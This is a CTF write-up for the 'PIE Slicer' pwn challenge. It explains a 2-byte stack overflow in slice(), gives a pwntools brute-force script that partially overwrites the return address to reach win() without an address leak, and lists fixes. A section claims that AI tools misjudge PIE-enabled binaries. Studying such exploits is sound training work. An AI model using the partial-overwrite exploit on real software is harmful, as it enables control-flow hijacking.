# SecurinetsENIT CTF - PIE Slicer Technical Writeup

- **Wave:** 2 (Control Hijacking & Gadgets)
- **Category:** Pwn / Binary Exploitation
- **Difficulty:** Intermediate
- **Target OS:** Ubuntu 22.04 LTS (x86_64)
- **Mitigations:**
  - Canary: Disabled (`-fno-stack-protector`)
  - NX: Enabled
  - PIE: **Enabled** (`-fPIE -pie`)

---

## 1. Vulnerability Analysis

In `slice()`:
```c
char buffer[64];
read(0, buffer, 74);
```
Offset to Saved RIP:
- `buffer`: 64 bytes
- Saved `RBP`: 8 bytes
- Total: 64 + 8 = 72 bytes.

With a 74-byte read, we have:
74 - 72 = 2 bytes of control over the **Saved Return Instruction Pointer (RIP)**!

---

## 2. The Anti-AI Trap: PIE Without an Address Leak

When automated AI tools inspect a binary with **PIE enabled**, their default reasoning is:
> "PIE is enabled. We cannot build an exploit without first finding an information leak to compute the base address."

Because this binary provides **no information leak**, an AI will claim the challenge is either unsolvable or attempt non-existent format string leaks.

A human reverse engineer knows the fundamental property of modern OS virtual memory:
### Virtual Memory Page Alignment (0x1000 / 4KB)
- Linux allocates memory in 4096-byte (4KB = 0x1000) pages.
- When ASLR randomizes the base address of a PIE binary, it shifts the base by a multiple of 0x1000.
- This means the lowest **12 bits (3 hexadecimal nibbles)** of every function and instruction NEVER change!

Let us check the disassembly in GDB / objdump:
```text
0000000000001219 <win>:
...
00000000000012a4 <slice>:
...
00000000000012e8 <main>:
...
12f2:  call   12a4 <slice>
12f7:  lea    rax,[rip+0xd54]  <- Saved RIP returns here!
```
Notice:
- The return address saved on the stack is 0x...12f7.
- The address of `win()` is 0x...1219.
- The upper bytes (0x55555555...) are identical because both functions are in the same code page!
- The lowest 12 bits of win() are always 0x219!
- The 4th nibble (0x1) may vary depending on page randomization, giving only 16 possibilities (0x0 to 0xF).

---

## 3. Exploitation Walkthrough: 2-Byte Partial Overwrite

By sending:
`72 bytes Padding + 2 bytes: 0x1219`, there is a **1 in 16 chance** (6.25%) on each run of hitting win() directly!

A simple loop:
```python
from pwn import *

while True:
    try:
        p = process("./pie_slicer")
        payload = b"A" * 72 + p16(0x1219)
        p.send(payload)
        output = p.recvall(timeout=1)
        if b"Securinets" in output:
            print(output)
            break
        p.close()
    except:
        continue
```
Within a few attempts (averaging ~16 runs), the target executes without ever leaking a single byte of memory!

---

## 4. Defensive Remediation & Secure Coding

1. Restrict `read()` to strictly `sizeof(buffer)`:
   ```c
   read(0, buffer, sizeof(buffer));
   ```
2. Enable stack canaries: `-fstack-protector-all`.
